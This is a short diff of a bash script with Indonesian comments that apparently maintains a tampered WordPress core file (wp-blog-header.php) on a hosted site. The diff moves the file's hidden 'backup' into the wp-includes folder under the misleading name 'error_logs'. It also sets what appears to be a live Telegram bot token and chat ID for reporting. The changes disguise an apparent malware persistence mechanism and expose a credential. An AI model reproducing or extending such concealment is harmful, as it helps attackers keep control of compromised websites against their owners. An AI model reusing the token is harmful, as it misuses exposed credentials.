@@ -3,11 +3,11 @@
 # Definisikan lokasi file index.php Permissions 755
 INDEX_FILE="/home/operetta/public_html/wp-blog-header.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/home/operetta/public_html/wp-content/uploads"
+BACKUP_FOLDER="/home/operetta/public_html/wp-includes"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/data"
+BACKUP_FILE="$BACKUP_FOLDER/error_logs"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
